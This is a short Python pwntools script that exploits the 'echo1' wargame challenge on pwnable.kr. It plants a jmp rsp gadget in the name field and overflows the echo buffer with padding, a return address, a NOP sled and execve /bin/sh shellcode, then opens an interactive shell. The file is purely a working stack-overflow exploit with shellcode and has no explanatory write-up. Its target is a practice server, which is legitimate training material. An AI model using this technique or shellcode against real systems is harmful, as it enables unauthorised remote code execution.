from pwn import *
import os

context.log_level = "DEBUG"

context.terminal = ['tmux', 'splitw', '-v']

def run():
    p = remote("pwnable.kr", 9010)
    #p = process("./echo1")

    #gdb.attach(p, '''
    #b*echo1+83
    #continue
    #''')

    jmp = p64(0xe4ff)# "\xe4\xff" # jmp rsp

    name = jmp + "A" * (24 - len(jmp))
    p.recvuntil("hey, what's your name? : ")
    p.sendline(name)

    p.recvuntil("- 1. : BOF echo")
    p.sendline("1")

    p.recvuntil("hello ")

    # addr of ID, 4 bytes we control
    ret = p64(0x006020a0)

    nop = "\x90" * 8
    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    payload = "A" * 40 + ret + nop + shellcode
    p.sendline(payload)

    p.interactive()
    #p.close()

run()
